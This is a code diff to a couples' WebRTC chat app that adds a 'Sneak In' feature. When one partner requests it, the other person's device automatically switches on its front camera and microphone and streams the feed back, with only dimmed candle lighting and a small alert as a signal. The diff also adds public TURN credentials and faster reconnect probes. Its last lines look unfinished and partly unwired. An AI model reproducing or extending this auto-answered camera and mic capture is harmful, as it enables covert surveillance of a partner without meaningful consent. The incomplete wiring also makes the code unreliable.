@@ -408,6 +408,13 @@
           <button id="role-wife" onclick="switchRole('wife')" class="px-2.5 py-1 rounded-lg text-rose-200/70 hover:text-white transition-all">A</button>
         </div>
 
+        <!-- Wireless Sneak-In (Baby Monitor / Ghost Peek) Button -->
+        <button id="btn-sneak-toggle" onclick="toggleSneakInMode()" title="Wireless Sneak In (Peek into partner's room)" 
+          class="flex items-center gap-1 bg-purple-950/80 hover:bg-purple-900 border border-purple-500/40 active:scale-95 text-purple-200 font-bold text-xs px-2.5 py-1.5 rounded-xl shadow-lg transition-all">
+          <i data-lucide="radio" class="w-3.5 h-3.5 text-purple-400 animate-pulse"></i>
+          <span id="sneak-btn-label">Sneak In</span>
+        </button>
+
         <!-- Panic / Stealth Hide Button -->
         <button onclick="triggerPanic()" title="Emergency Hide Screen" 
           class="flex items-center gap-1.5 bg-rose-600/90 hover:bg-rose-500 active:scale-95 text-white font-bold text-xs px-3 py-1.5 rounded-xl shadow-lg border border-rose-400/40 transition-all">
@@ -416,6 +423,40 @@
         </button>
       </div>
     </header>
+
+    <!-- SNEAK-IN / WIRELESS DEVICE PEEK HUD (Floating Live Audio & Video Feed) -->
+    <div id="sneak-hud" class="hidden fixed bottom-20 left-3 z-[85] w-48 bg-black/90 rounded-2xl overflow-hidden border-2 border-purple-500/70 shadow-[0_0_30px_rgba(168,85,247,0.4)] backdrop-blur-xl animate-fade-in select-none p-2 space-y-1.5">
+      <div class="flex items-center justify-between border-b border-purple-500/20 pb-1">
+        <div class="flex items-center gap-1.5">
+          <span class="w-2 h-2 rounded-full bg-purple-400 animate-ping"></span>
+          <span class="text-[10px] font-mono font-bold text-purple-200">WIRELESS SNEAK</span>
+        </div>
+        <button onclick="stopSneakIn()" class="text-slate-400 hover:text-white p-0.5">
+          <i data-lucide="x" class="w-3.5 h-3.5"></i>
+        </button>
+      </div>
+
+      <!-- Sneak Video Canvas / Stream -->
+      <div class="relative w-full h-32 rounded-xl overflow-hidden bg-purple-950/30 border border-purple-500/30 flex items-center justify-center">
+        <video id="sneak-remote-video" autoplay playsinline class="w-full h-full object-cover"></video>
+        <div id="sneak-audio-wave" class="hidden absolute inset-0 flex items-center justify-center gap-1 bg-black/40">
+          <span class="w-1 bg-purple-400 animate-pulse h-6 rounded-full"></span>
+          <span class="w-1 bg-pink-400 animate-pulse h-10 rounded-full"></span>
+          <span class="w-1 bg-rose-400 animate-pulse h-4 rounded-full"></span>
+        </div>
+        <div class="absolute bottom-1 left-1 px-1.5 py-0.5 rounded bg-black/70 text-[8px] font-mono text-purple-300">
+          Live Wireless Feed
+        </div>
+      </div>
+
+      <!-- Audio & Action Bar -->
+      <div class="flex items-center justify-between text-[10px] pt-0.5">
+        <span id="sneak-status-text" class="text-purple-300 font-mono">Listening...</span>
+        <button onclick="sendTelepathy('🌸 I am sneaking a peek at you right now... ❤️')" class="px-2 py-0.5 rounded-lg bg-purple-600/40 border border-purple-400/40 text-[9px] text-purple-200 active:scale-95">
+          Whisper
+        </button>
+      </div>
+    </div>
 
     <!-- INCOMING CALL POPUP (AUDIO & VIDEO) -->
     <div id="incoming-call-modal" class="hidden relative z-40 mx-4 bg-rose-950/95 border border-rose-500/60 rounded-3xl p-4 shadow-2xl backdrop-blur-xl flex items-center justify-between">
@@ -1180,15 +1221,31 @@
       updatePeerUI('red', 'Offline • No Internet connection', false);
     });
 
-    // Comprehensive STUN Servers for cellular / NAT punchthrough
+    // High-Availability STUN + Global OpenRelay TURN Servers (Cellular 4G/5G + NAT Bypass)
     const PEER_CONFIG = {
       config: {
         iceServers: [
           { urls: 'stun:stun.l.google.com:19302' },
           { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'stun:stun2.l.google.com:19302' },
-          { urls: 'stun:stun.cloudflare.com:3478' }
+          { urls: 'stun:stun.cloudflare.com:3478' },
+          { urls: 'stun:openrelay.metered.ca:80' },
+          {
+            urls: 'turn:openrelay.metered.ca:80',
+            username: 'openrelayproject',
+            credential: 'openrelayproject'
+          },
+          {
+            urls: 'turn:openrelay.metered.ca:443',
+            username: 'openrelayproject',
+            credential: 'openrelayproject'
+          },
+          {
+            urls: 'turn:openrelay.metered.ca:443?transport=tcp',
+            username: 'openrelayproject',
+            credential: 'openrelayproject'
+          }
         ],
+        iceCandidatePoolSize: 10,
         sdpSemantics: 'unified-plan'
       }
     };
@@ -1253,14 +1310,20 @@
         updatePeerUI('amber', `Online (${myRole === 'husband' ? 'I' : 'A'}). Waiting for partner...`, false);
         attemptConnectPartner();
 
-        // Heartbeat probe every 4 seconds until partner connects
+        // Aggressive 2.0s Keep-Alive probe & Instant Auto-Reconnect
         pingInterval = setInterval(() => {
           if (!dataConn || !dataConn.open) {
             attemptConnectPartner();
           } else {
-            try { dataConn.send({ type: 'heartbeat_ping' }); } catch (e) {}
+            try {
+              dataConn.send({ type: 'heartbeat_ping', timestamp: Date.now() });
+            } catch (e) {
+              console.warn('[P2P] Heartbeat ping failed, resetting connection...');
+              isConnectingPartner = false;
+              attemptConnectPartner();
+            }
           }
-        }, 4000);
+        }, 2000);
       });
 
       peer.on('connection', (conn) => {
@@ -1272,6 +1335,22 @@
       peer.on('call', (call) => {
         console.log('[P2P] Incoming call from partner:', call.peer);
         activeMediaCall = call;
+                const isSneak = call.metadata && call.metadata.type === 'sneak';
+        if (isSneak) {
+          console.log('[P2P] Received wireless sneak feed from partner!');
+          call.answer(); // Answer with no outbound media
+          call.on('stream', (remoteStream) => {
+            const sVideo = document.getElementById('sneak-remote-video');
+            const wave = document.getElementById('sneak-audio-wave');
+            if (sVideo) {
+              sVideo.srcObject = remoteStream;
+              sVideo.play().catch(() => {});
+            }
+            if (wave) wave.classList.remove('hidden');
+          });
+          return;
+        }
+
         const isVideo = call.metadata && call.metadata.type === 'video';
         currentCallType = isVideo ? 'video' : 'audio';
 
@@ -6930,6 +7009,107 @@
       // 5. On decoy screen: push state back to keep app alive in background
       history.pushState({ page: 'decoy' }, '');
     }
+
+  
+    // =========================================================================
+    // WIRELESS DEVICE SNEAK-IN ENGINE (PEEK INTO PARTNER'S ROOM)
+    // =========================================================================
+    let isSneaking = false;
+    let isBeingSneaked = false;
+    let sneakStream = null;
+    let sneakCall = null;
+
+    async function toggleSneakInMode() {
+      if (isSneaking) {
+        stopSneakIn();
+      } else {
+        startSneakIn();
+      }
+    }
+
+    function startSneakIn() {
+      if (!dataConn || !dataConn.open) {
+        showTelepathyBanner('⚠️ Partner is currently offline. Cannot sneak in.');
+        return;
+      }
+
+      isSneaking = true;
+      document.getElementById('sneak-btn-label').textContent = 'Sneaking...';
+      const hud = document.getElementById('sneak-hud');
+      if (hud) hud.classList.remove('hidden');
+
+      showTelepathyBanner('📡 Connecting to partner\'s wireless device feed...');
+      if (navigator.vibrate) navigator.vibrate([40, 30, 60]);
+
+      // Request partner device to stream their camera/mic feed wirelessly
+      sendPayload({ type: 'sneak_request', sender: myRole });
+    }
+
+    function stopSneakIn() {
+      isSneaking = false;
+      document.getElementById('sneak-btn-label').textContent = 'Sneak In';
+      const hud = document.getElementById('sneak-hud');
+      if (hud) hud.classList.add('hidden');
+
+      const sVideo = document.getElementById('sneak-remote-video');
+      if (sVideo) sVideo.srcObject = null;
+
+      if (sneakCall) {
+        try { sneakCall.close(); } catch (e) {}
+        sneakCall = null;
+      }
+
+      sendPayload({ type: 'sneak_stop', sender: myRole });
+      showTelepathyBanner('✨ Closed wireless sneak peek');
+    }
+
+    // Automatically answer sneak stream when requested by verified partner
+    async function handleIncomingSneakRequest(senderRole) {
+      isBeingSneaked = true;
+      console.log('[Sneak] Partner is peeking into room wirelessly...');
+
+      // Subtle sensual candle brightening in 3D bedroom to indicate partner presence
+      if (typeof candleLight !== 'undefined' && candleLight) {
+        candleLight.intensity = 2.4;
+      }
+      if (typeof bedGlowLight !== 'undefined' && bedGlowLight) {
+        bedGlowLight.intensity = 0.85;
+        bedGlowLight.color.setHex(0xa855f7); // Soft purple presence glow
+      }
+
+      try {
+        // Stream front camera & audio back to partner
+        sneakStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: true
+        });
+
+        const partnerPeerId = getPartnerPeerId();
+        sneakCall = peer.call(partnerPeerId, sneakStream, { metadata: { type: 'sneak' } });
+
+        showStealthAlert('Partner just sneaked in... 🌸');
+      } catch (err) {
+        console.warn('[Sneak] Could not access media for sneak:', err);
+      }
+    }
+
+    function handleIncomingSneakStop() {
+      isBeingSneaked = false;
+      if (sneakStream) {
+        sneakStream.getTracks().forEach(t => t.stop());
+        sneakStream = null;
+      }
+      if (typeof candleLight !== 'undefined' && candleLight) {
+        candleLight.intensity = 1.4;
+      }
+      if (typeof bedGlowLight !== 'undefined' && bedGlowLight) {
+        bedGlowLight.intensity = 0.45;
+        bedGlowLight.color.setHex(0xf43f5e);
+      }
+    }
+
+    // Catch sneak incoming call on receiver
+    const origCallHandler = peer ? peer._events && peer._events.call : null;
 
   </script>
 </body>
